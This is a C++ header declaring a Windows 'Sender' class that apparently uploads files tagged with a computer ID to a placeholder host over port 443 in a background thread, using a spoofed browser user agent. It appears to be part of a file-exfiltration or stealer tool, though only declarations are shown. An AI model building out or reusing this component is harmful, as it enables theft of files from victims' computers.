#pragma once

#include <Windows.h>
#include <wininet.h>
#include <string>
#include <iostream>
#include <filesystem>
#include <vector>
#include <memory>

#pragma comment(lib, "wininet.lib")

#define DEFAULT_USERAGENT "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
#define MY_HOST "YOUR HOST HERE"
#define MY_PORT 443
#define METHOD_POST "POST"

class Sender
{
public:
	Sender();
	~Sender();

	bool uploadFile(std::string filePath, std::string fileName, std::string computerId);
	void startSending();

	static DWORD WINAPI sendingThread(PVOID instance);
	HANDLE startThread();
};

